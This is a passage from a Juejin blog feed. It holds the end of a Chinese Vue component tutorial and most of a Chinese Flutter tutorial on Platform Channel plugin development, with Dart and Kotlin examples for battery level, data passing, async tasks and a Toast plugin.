    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>这是基础设置页面。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p><strong>作用：</strong><br/>
定义组件渲染到页面上的实际 DOM 内容。</p>
<p><strong>特点：</strong></p>
<ul>
<li>必须有一个根节点（比如 <code>&lt;div&gt;</code>）。</li>
<li>可以写正常 HTML、Vue 模板语法（v-if、v-for、绑定等）。</li>
</ul>
<hr/>
<h3 data-id="heading-12">2. <code>&lt;script&gt;</code> 组件的逻辑（JS 代码)</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'BaseSetting'</span>,
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>作用：</strong></p>
<ul>
<li>导出当前组件的对象（类似 class）</li>
<li>定义组件名称、数据、方法、生命周期等</li>
</ul>
<p><strong>常见写法：</strong></p>
<h4 data-id="heading-13">🔹 传统 Options API</h4>
<pre><code class="hljs language-html" lang="html">export default {
  name: 'BaseSetting',
  data() { return {} },
  methods: {},
  mounted() {},
}
</code></pre>
<h4 data-id="heading-14">🔹 Composition API（更推荐）</h4>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">const</span> count = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-15">3. <code>&lt;style&gt;</code> 组件的样式（CSS）</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
<span class="hljs-selector-class">.page</span> { <span class="hljs-attribute">padding</span>: <span class="hljs-number">16px</span>; }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<p><strong>作用：</strong></p>
<p>给当前组件写样式。</p>
<p><code>scoped</code> 的意思：<br/>
<strong>样式只对当前组件生效，不会影响其他页面。</strong></p>
<hr/>
<p>🌱 下一步计划：学习 vue框架的基本语法。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[《Flutter全栈开发实战指南：从零到高级》- 22 -插件开发与原生交互]]></title>    <link>https://juejin.cn/post/7579904059525791770</link>    <guid>https://juejin.cn/post/7579904059525791770</guid>    <pubDate>2025-12-05T03:20:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579904059525791770" data-draft-id="7579904059525759002" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="《Flutter全栈开发实战指南：从零到高级》- 22 -插件开发与原生交互"/> <meta itemprop="keywords" content="Flutter,Android,iOS"/> <meta itemprop="datePublished" content="2025-12-05T03:20:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="QuantumLeap丶"/> <meta itemprop="url" content="https://juejin.cn/user/1767603104125197"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            《Flutter全栈开发实战指南：从零到高级》- 22 -插件开发与原生交互
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1767603104125197/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    QuantumLeap丶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-05T03:20:42.000Z" title="Fri Dec 05 2025 03:20:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<blockquote>
<p>很多人把Flutter插件开发想得太复杂，其实它的本质就是把Dart语言转换成Java/Swift能识别的语言，再把原生平台的回应翻译回Dart。今天，我们将Flutter与原生平台交互的工作机制彻底搞明白。</p>
</blockquote>
<h3 data-id="heading-1">为什么需要原生交互？</h3>
<p>在正式开始之前，我们先思考一个问题：Flutter作为一个跨平台框架，它的跨平台能力边界在哪里？</p>
<p>实际上，<strong>Flutter的跨平台能力主要体现在UI渲染层</strong>。Dart代码编译后可以在Android和iOS上运行，Flutter引擎负责将Widget树渲染成对应的平台视图。但当我们想要访问平台某些特定功能时，比如：调用系统相机/相册、使用蓝牙或NFC等功能，这些情况下，我们就需要桥接原生代码。</p>
<h3 data-id="heading-2">一、Platform Channel：Flutter与原生交互的桥梁</h3>
<h4 data-id="heading-3">1.1 核心架构</h4>
<p>很多人以为Platform Channel就是一个简单的管道，其实它是<strong>三层协议栈</strong>：<code>Dart层</code>，<code>引擎层</code>，<code>平台层</code>；让我们先通过一张架构图来加深理解Platform Channel的整体结构：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[Flutter Dart代码] --&gt;|MethodChannel| B[Flutter Framework层]
    B --&gt;|C++编解码| C[Flutter Engine引擎]
    C --&gt;|平台消息路由| D[Android平台]
    C --&gt;|平台消息路由| E[iOS平台]
    D --&gt;|JNI/Java调用| F[Native Android代码]
    E --&gt;|Objective-C/Swift调用| G[Native iOS代码]
    
    subgraph "Platform Channel通信流"
        direction LR
        H[Dart发起调用] --&gt; I[消息序列化] --&gt; J[通过BinaryMessenger传递] --&gt; K[平台侧反序列化] --&gt; L[执行原生代码] --&gt; M[返回结果序列化] --&gt; N[Dart侧接收结果]
    end
</code></pre>
<p><strong>备注</strong>：</p>
<ul>
<li><strong>MethodChannel</strong>：最常用的通道，用于方法调用</li>
<li><strong>EventChannel</strong>：用于从原生到Dart的事件流</li>
<li><strong>BasicMessageChannel</strong>：用于简单的消息传递，较少使用</li>
<li><strong>BinaryMessenger</strong>：底层消息传递机制，所有Channel都基于它</li>
</ul>
<h4 data-id="heading-4">1.2 交互原理</h4>
<p><strong>具体步骤</strong>：</p>
<ol>
<li><strong>Dart代码</strong>：你把需求用Dart语言写好，MethodChannel会将其转换成二进制数据格式</li>
<li><strong>Engine</strong>：通过Flutter引擎传递到对应平台</li>
<li><strong>Platform</strong>：Android/iOS接收到数据后进行拆解并理解其内容</li>
<li><strong>Native</strong>：Android/iOS端完成需求</li>
<li><strong>返回结果</strong>：反向再来一遍上述流程</li>
</ol>
<p>我们简单画个流程图，方便理解：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant D as Dart代码
    participant C as MethodChannel
    participant B as BinaryMessenger
    participant E as Flutter引擎
    participant P as 平台层(Android/iOS)
    participant N as Native代码
    
    D-&gt;&gt;C: invokeMethod("拍照", 参数)
    Note over C: 步骤1：打包&lt;br/&gt;把方法名+参数编码成二进制
    C-&gt;&gt;B: 发送二进制消息
    B-&gt;&gt;E: 跨边界传输
    Note over E: 步骤2：数据传递&lt;br/&gt;通过JNI/FFI传递
    E-&gt;&gt;P: 分发到对应平台
    P-&gt;&gt;N: 调用原生方法
    Note over N: 步骤3：本地执行&lt;br/&gt;Java/Swift实际处理
    N--&gt;&gt;P: 返回结果
    P--&gt;&gt;E: 编码结果
    E--&gt;&gt;B: 返回二进制
    B--&gt;&gt;C: 接收响应
    Note over C: 步骤4：解析&lt;br/&gt;解码二进制为Dart对象
    C--&gt;&gt;D: Future完成，返回结果
</code></pre>
<p><strong>代码层面的流程</strong>：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// Dart侧发起调用</span>
Future&lt;<span class="hljs-built_in">String</span>&gt; result = channel.invokeMethod(<span class="hljs-string">'getBatteryLevel'</span>);

<span class="hljs-comment">// 这行代码背后发生了什么？</span>
<span class="hljs-comment">// 1. invokeMethod将方法名和参数序列化为二进制消息</span>
<span class="hljs-comment">// 2. 通过BinaryMessenger.send()发送</span>
<span class="hljs-comment">// 3. 引擎收到消息，路由到对应平台</span>
<span class="hljs-comment">// 4. 平台侧处理消息，执行原生代码</span>
<span class="hljs-comment">// 5. 结果序列化后返回</span>
<span class="hljs-comment">// 6. Dart侧反序列化得到结果</span>
</code></pre>
<h4 data-id="heading-5">1.3 数据编解码</h4>
<p>如何跨语言传递复杂数据？不同编程语言有不同的数据类型系统，如何让Dart的<code>List&lt;Map&lt;String, dynamic&gt;&gt;</code>在Java和Swift中也能被理解？</p>
<p>Flutter使用标准化的消息编解码器：</p>
<ul>
<li><strong>StandardMessageCodec</strong>：默认编解码器，支持基础类型和列表、字典</li>
<li><strong>JSONMessageCodec</strong>：使用JSON格式编码</li>
<li><strong>StringCodec</strong>：只处理字符串</li>
<li><strong>BinaryCodec</strong>：原始二进制数据</li>
</ul>
<p><strong>编码规则表</strong>：</p>

































































<table><thead><tr><th>Dart类型</th><th>Java/Kotlin类型</th><th>Swift/OC类型</th></tr></thead><tbody><tr><td>null</td><td>null</td><td>nil</td></tr><tr><td>bool</td><td>java.lang.Boolean</td><td>NSNumber(numberWithBool:)</td></tr><tr><td>int</td><td>java.lang.Integer</td><td>NSNumber(numberWithInt:)</td></tr><tr><td>double</td><td>java.lang.Double</td><td>NSNumber(numberWithDouble:)</td></tr><tr><td>String</td><td>java.lang.String</td><td>NSString</td></tr><tr><td>Uint8List</td><td>byte[]</td><td>FlutterStandardTypedData typedDataWithBytes:</td></tr><tr><td>Int32List</td><td>int[]</td><td>FlutterStandardTypedData typedDataWithInt32:</td></tr><tr><td>Int64List</td><td>long[]</td><td>FlutterStandardTypedData typedDataWithInt64:</td></tr><tr><td>Float64List</td><td>double[]</td><td>FlutterStandardTypedData typedDataWithFloat64:</td></tr><tr><td>List</td><td>java.util.ArrayList</td><td>NSArray</td></tr><tr><td>Map</td><td>java.util.HashMap</td><td>NSDictionary</td></tr></tbody></table>
<p><strong>主要限制</strong>：</p>
<ul>
<li>不支持自定义类的直接传递</li>
<li>复杂对象需要先转换为Map/List等基本类型组合</li>
<li>大数据量传输需要考虑性能问题</li>
</ul>
<h3 data-id="heading-6">二、与Android原生交互</h3>
<h4 data-id="heading-7">2.1 以获取电池电量为例</h4>
<p>让我们从一个最简单的例子开始，了解完整的通信流程。</p>
<h5 data-id="heading-8">Dart侧代码</h5>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/services.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatteryPlugin</span> </span>{
  <span class="hljs-comment">// 1. 创建MethodChannel实例</span>
  <span class="hljs-comment">// 约定好通道名称（必须与原生侧完全一致）</span>
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> MethodChannel _channel = 
      MethodChannel(<span class="hljs-string">'com.xxxx/battery'</span>);
  
  <span class="hljs-comment">// 2. 公开的Dart方法</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-built_in">int</span>&gt; getBatteryLevel() <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-comment">// 3. 调用原生方法</span>
      <span class="hljs-comment">// invokeMethod的第一个参数是方法名(必须与原生侧对应)</span>
      <span class="hljs-keyword">final</span> <span class="hljs-built_in">int</span> level = <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'getBatteryLevel'</span>);
      <span class="hljs-keyword">return</span> level;
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-comment">// 4. 异常处理</span>
      <span class="hljs-built_in">print</span>(<span class="hljs-string">"获取电量失败: <span class="hljs-subst">${e.message}</span>"</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
    }
  }
}

<span class="hljs-comment">// 使用</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyApp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">StatelessWidget</span> </span>{
  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">return</span> MaterialApp(
      home: Scaffold(
        body: Center(
          child: ElevatedButton(
            child: Text(<span class="hljs-string">'获取电量'</span>),
            onPressed: () <span class="hljs-keyword">async</span> {
              <span class="hljs-comment">// 调用插件方法</span>
              <span class="hljs-built_in">int</span> level = <span class="hljs-keyword">await</span> BatteryPlugin.getBatteryLevel();
              <span class="hljs-keyword">if</span> (level != <span class="hljs-number">-1</span>) {
                <span class="hljs-built_in">print</span>(<span class="hljs-string">'当前电量: <span class="hljs-subst">$level</span>%'</span>);
              }
            },
          ),
        ),
      ),
    );
  }
}
</code></pre>
<h5 data-id="heading-9">Android侧代码（Kotlin）</h5>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">package</span> com.example.myapp

<span class="hljs-keyword">import</span> android.content.Context
<span class="hljs-keyword">import</span> android.content.ContextWrapper
<span class="hljs-keyword">import</span> android.content.Intent
<span class="hljs-keyword">import</span> android.content.IntentFilter
<span class="hljs-keyword">import</span> android.os.BatteryManager
<span class="hljs-keyword">import</span> android.os.Build.VERSION
<span class="hljs-keyword">import</span> android.os.Build.VERSION_CODES
<span class="hljs-keyword">import</span> io.flutter.embedding.android.FlutterActivity
<span class="hljs-keyword">import</span> io.flutter.embedding.engine.FlutterEngine
<span class="hljs-keyword">import</span> io.flutter.plugin.common.MethodChannel

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">FlutterActivity</span>() {
    <span class="hljs-comment">// 1. 定义通道名称（必须与Dart侧一致）</span>
    <span class="hljs-keyword">companion</span> <span class="hljs-keyword">object</span> {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">val</span> CHANNEL = <span class="hljs-string">"com.xxxx/battery"</span>
    }
    
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">configureFlutterEngine</span><span class="hljs-params">(flutterEngine: <span class="hljs-type">FlutterEngine</span>)</span></span> {
        <span class="hljs-keyword">super</span>.configureFlutterEngine(flutterEngine)
        
        <span class="hljs-comment">// 2. 创建MethodChannel</span>
        MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            CHANNEL
        ).setMethodCallHandler { call, result -&gt;
            <span class="hljs-comment">// 3. 处理方法调用</span>
            <span class="hljs-keyword">when</span> (call.method) {
                <span class="hljs-string">"getBatteryLevel"</span> -&gt; {
                    <span class="hljs-comment">// 4. 执行实际的原生代码</span>
                    <span class="hljs-keyword">val</span> batteryLevel = getBatteryLevel()
                    
                    <span class="hljs-keyword">if</span> (batteryLevel != -<span class="hljs-number">1</span>) {
                        <span class="hljs-comment">// 5. 返回成功结果</span>
                        result.success(batteryLevel)
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-comment">// 6. 返回错误结果</span>
                        result.error(
                            <span class="hljs-string">"UNAVAILABLE"</span>,
                            <span class="hljs-string">"无法获取电量信息"</span>,
                            <span class="hljs-literal">null</span>
                        )
                    }
                }
                <span class="hljs-keyword">else</span> -&gt; {
                    <span class="hljs-comment">// 7. 处理未实现的方法</span>
                    result.notImplemented()
                }
            }
        }
    }
    
    <span class="hljs-comment">// 获取电量的实际实现</span>
    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getBatteryLevel</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Int</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (VERSION.SDK_INT &gt;= VERSION_CODES.LOLLIPOP) {
            <span class="hljs-keyword">val</span> batteryManager = getSystemService(Context.BATTERY_SERVICE) <span class="hljs-keyword">as</span> BatteryManager
            batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// 旧版本Android的兼容处理</span>
            <span class="hljs-keyword">val</span> intent = ContextWrapper(applicationContext)
                .registerReceiver(<span class="hljs-literal">null</span>, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            <span class="hljs-keyword">val</span> level = intent?.getIntExtra(BatteryManager.EXTRA_LEVEL, -<span class="hljs-number">1</span>) ?: -<span class="hljs-number">1</span>
            <span class="hljs-keyword">val</span> scale = intent?.getIntExtra(BatteryManager.EXTRA_SCALE, -<span class="hljs-number">1</span>) ?: -<span class="hljs-number">1</span>
            
            <span class="hljs-keyword">if</span> (level == -<span class="hljs-number">1</span> || scale == -<span class="hljs-number">1</span>) {
                -<span class="hljs-number">1</span>
            } <span class="hljs-keyword">else</span> {
                (level * <span class="hljs-number">100</span> / scale.toFloat()).toInt()
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-10">2.2 复杂参数传递：从Dart传递数据到Android</h4>
<p>实际开发中，我们经常需要传递复杂参数。看看如何传递一个用户对象：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// Dart侧</span>
Future&lt;<span class="hljs-keyword">void</span>&gt; saveUser(User user) <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 将User对象转换为Map</span>
    <span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">dynamic</span>&gt; userMap = {
      <span class="hljs-string">'name'</span>: user.name,
      <span class="hljs-string">'age'</span>: user.age,
      <span class="hljs-string">'email'</span>: user.email,
      <span class="hljs-string">'isVip'</span>: user.isVip,
    };
    
    <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'saveUser'</span>, userMap);
  } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'保存用户失败: <span class="hljs-subst">${e.message}</span>'</span>);
  }
}
</code></pre>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Android侧（Kotlin）</span>
.setMethodCallHandler { call, result -&gt;
    <span class="hljs-keyword">when</span> (call.method) {
        <span class="hljs-string">"saveUser"</span> -&gt; {
            <span class="hljs-comment">// 获取参数</span>
            <span class="hljs-keyword">val</span> arguments = call.arguments <span class="hljs-keyword">as</span>? Map&lt;*, *&gt;
            
            <span class="hljs-keyword">if</span> (arguments != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">val</span> name = arguments[<span class="hljs-string">"name"</span>] <span class="hljs-keyword">as</span>? String
                <span class="hljs-keyword">val</span> age = arguments[<span class="hljs-string">"age"</span>] <span class="hljs-keyword">as</span>? <span class="hljs-built_in">Int</span>
                <span class="hljs-keyword">val</span> email = arguments[<span class="hljs-string">"email"</span>] <span class="hljs-keyword">as</span>? String
                <span class="hljs-keyword">val</span> isVip = arguments[<span class="hljs-string">"isVip"</span>] <span class="hljs-keyword">as</span>? <span class="hljs-built_in">Boolean</span>
                
                <span class="hljs-comment">// 保存</span>
                <span class="hljs-keyword">val</span> success = saveUserToStorage(name, age, email, isVip)
                
                <span class="hljs-keyword">if</span> (success) {
                    result.success(<span class="hljs-literal">null</span>) 
                } <span class="hljs-keyword">else</span> {
                    result.error(<span class="hljs-string">"SAVE_FAILED"</span>, <span class="hljs-string">"保存用户失败"</span>, <span class="hljs-literal">null</span>)
                }
            } <span class="hljs-keyword">else</span> {
                result.error(<span class="hljs-string">"INVALID_ARGUMENTS"</span>, <span class="hljs-string">"参数格式错误"</span>, <span class="hljs-literal">null</span>)
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-11">2.3 异步操作处理：长时间运行的任务</h4>
<p>有些原生操作可能耗时较长，比如下载文件、处理图像等，我们需要正确处理异步：</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Android侧：使用协程处理异步任务</span>
.setMethodCallHandler { call, result -&gt;
    <span class="hljs-keyword">when</span> (call.method) {
        <span class="hljs-string">"processImage"</span> -&gt; {
            <span class="hljs-keyword">val</span> imagePath = call.arguments <span class="hljs-keyword">as</span>? String
            
            <span class="hljs-comment">// 启动协程处理耗时操作</span>
            CoroutineScope(Dispatchers.IO).launch {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">val</span> processedPath = processImageHeavy(imagePath)
                    
                    <span class="hljs-comment">// 切回主线程返回结果</span>
                    withContext(Dispatchers.Main) {
                        result.success(processedPath)
                    }
                } <span class="hljs-keyword">catch</span> (e: Exception) {
                    withContext(Dispatchers.Main) {
                        result.error(<span class="hljs-string">"PROCESS_FAILED"</span>, e.message, <span class="hljs-literal">null</span>)
                    }
                }
            }
            
            <span class="hljs-comment">// 注意：这里没有立即调用result方法，异步操作完成后才调用</span>
        }
    }
}
</code></pre>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// Dart侧：添加超时处理</span>
Future&lt;<span class="hljs-built_in">String</span>&gt; processImage(<span class="hljs-built_in">String</span> imagePath) <span class="hljs-keyword">async</span> {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 设置超时时间</span>
    <span class="hljs-keyword">final</span> result = <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'processImage'</span>, imagePath)
        .timeout(<span class="hljs-built_in">Duration</span>(seconds: <span class="hljs-number">10</span>));
    
    <span class="hljs-keyword">return</span> result <span class="hljs-keyword">as</span> <span class="hljs-built_in">String</span>;
  } <span class="hljs-keyword">on</span> TimeoutException {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'图片处理超时'</span>);
    <span class="hljs-keyword">throw</span> Exception(<span class="hljs-string">'处理超时'</span>);
  } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'图片处理失败: <span class="hljs-subst">${e.message}</span>'</span>);
    <span class="hljs-keyword">throw</span> Exception(e.message);
  }
}
</code></pre>
<h4 data-id="heading-12">2.4 以Toast消息插件为例</h4>
<p>让我们创建一个完整的Android Toast插件：</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">// flutter_toast.dart</span>
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/services.dart'</span>;

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FlutterToast</span> </span>{
  <span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> MethodChannel _channel = 
      MethodChannel(<span class="hljs-string">'com.xxxx/toast'</span>);
  
  <span class="hljs-comment">// 显示短时Toast</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; showShort(<span class="hljs-built_in">String</span> message) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'showShortToast'</span>, message);
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
      <span class="hljs-built_in">print</span>(<span class="hljs-string">'显示Toast失败: <span class="hljs-subst">${e.message}</span>'</span>);
    }
  }
  
  <span class="hljs-comment">// 显示长时Toast</span>
  <span class="hljs-keyword">static</span> Future&lt;<span class="hljs-keyword">void</span>&gt; showLong(<span class="hljs-built_in">String</span> message) <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> _channel.invokeMethod(<span class="hljs-string">'showLongToast'</span>, message);
    } <span class="hljs-keyword">on</span> PlatformException <span class="hljs-keyword">catch</span> (e) {
